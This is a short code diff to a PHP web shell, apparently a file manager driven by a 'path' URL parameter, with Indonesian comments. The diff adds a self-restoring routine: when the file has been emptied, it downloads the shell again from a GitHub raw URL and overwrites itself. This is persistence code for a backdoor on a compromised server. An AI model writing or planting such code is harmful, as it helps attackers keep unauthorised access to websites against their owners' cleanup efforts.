@@ -2,6 +2,16 @@
 error_reporting(E_ALL);
 ini_set('display_errors', 1);
 
+// ==== AUTO RECOVER JIKA FILE 0KB ====
+$self = __FILE__;
+if (filesize($self) === 0) {
+    // Auto-download ulang shell dari server kamu
+    $backup_url = 'https://raw.githubusercontent.com/Fv3R-Dizzy/shellkoplak/refs/heads/main/apalagiini.php';
+    $content = @file_get_contents($backup_url);
+    if ($content) file_put_contents($self, $content);
+    exit;
+}
+
 $path = isset($_GET['path']) ? $_GET['path'] : getcwd();
 if (!is_dir($path)) $path = getcwd();
 $real_path = realpath($path);
